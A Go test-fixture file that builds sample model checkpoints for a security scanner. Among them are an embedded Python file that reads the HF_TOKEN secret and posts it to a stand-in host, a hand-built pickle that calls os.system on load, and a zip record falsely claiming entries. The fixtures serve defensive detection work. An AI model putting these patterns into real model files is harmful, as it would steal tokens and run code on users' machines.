package fixture

import (
	"archive/zip"
	"bytes"
	"encoding/binary"
)

// RiskyPy imports network and process modules and reads the environment.
// It is read as text and never run.
func RiskyPy() []byte {
	return []byte(`"""Demo modeling file (fixture; never executed)."""
import os
import requests
from subprocess import run


class DemoModel:
    def load(self):
        key = os.environ["HF_TOKEN"]
        requests.post("https://example.invalid/collect", data=key)
        exec("print(1)")
`)
}

// CleanPy uses neither network, process nor code-loading names.
func CleanPy() []byte {
	return []byte("import math\n\n\nclass Clean:\n    def f(self, x):\n        return math.sqrt(x)\n")
}

func unicode1(s string) []byte {
	return append([]byte{0x8c, byte(len(s))}, s...)
}

// PickleOSSystem is a protocol 2 pickle: GLOBAL os.system, then REDUCE.
func PickleOSSystem() []byte {
	b := []byte{0x80, 0x02}
	b = append(b, "cos\nsystem\n"...)
	b = append(b, 'X', 4, 0, 0, 0)
	b = append(b, "echo"...)
	return append(b, 0x85, 'R', '.')
}

// PickleTorchP4 is a protocol 4 pickle that reaches torch._utils and
// collections.OrderedDict through STACK_GLOBAL.
func PickleTorchP4() []byte {
	b := []byte{0x80, 0x04}
	b = append(b, unicode1("torch._utils")...)
	b = append(b, 0x94)
	b = append(b, unicode1("_rebuild_tensor_v2")...)
	b = append(b, 0x94, 0x93, 0x94)
	b = append(b, unicode1("collections")...)
	b = append(b, 0x94)
	b = append(b, unicode1("OrderedDict")...)
	b = append(b, 0x94, 0x93, 0x94, ')', 'R', 0x94, '.')
	return b
}

// PickleTruncated is PickleTorchP4 cut before STOP.
func PickleTruncated() []byte {
	b := PickleTorchP4()
	return b[:len(b)-12]
}

// TorchZip is a torch-format archive whose data.pkl is stored, not deflated.
func TorchZip(pickle []byte) []byte { return zipWith("archive/data.pkl", pickle, zip.Store) }

// TorchZipDeflated has a deflated data.pkl, which must be reported and not inflated.
func TorchZipDeflated(pickle []byte) []byte {
	return zipWith("archive/data.pkl", pickle, zip.Deflate)
}

func zipWith(name string, data []byte, method uint16) []byte {
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	f, err := w.CreateHeader(&zip.FileHeader{Name: name, Method: method})
	if err != nil {
		panic(err)
	}
	f.Write(data)
	w.Close()
	return buf.Bytes()
}

// ZipClaimingEntries is an end-of-central-directory record that claims n
// entries over an empty directory.
func ZipClaimingEntries(n uint16) []byte {
	b := make([]byte, 22)
	binary.LittleEndian.PutUint32(b, 0x06054b50)
	binary.LittleEndian.PutUint16(b[8:], n)
	binary.LittleEndian.PutUint16(b[10:], n)
	return append([]byte("PK\x03\x04"), b...)
}

// CodeScan is a checkpoint whose config points auto_map at a risky .py,
// with a dangerous pickle, a usual torch pickle and a clean .py beside it.
func CodeScan() ([]File, error) {
	files, err := CodeExec()
	if err != nil {
		return nil, err
	}
	var out []File
	for _, f := range files {
		switch f.Name {
		case "config.json":
			f.Data = []byte(`{"model_type":"demo","auto_map":{"AutoModelForCausalLM":"modeling_risky.DemoModel"}}`)
		case "modeling_demo.py", "weights.bin":
			continue
		}
		out = append(out, f)
	}
	return append(out,
		File{Name: "modeling_risky.py", Data: RiskyPy()},
		File{Name: "utils_clean.py", Data: CleanPy()},
		File{Name: "pytorch_model.bin", Data: PickleOSSystem()},
		File{Name: "optimizer.pt", Data: TorchZip(PickleTorchP4())},
	), nil
}
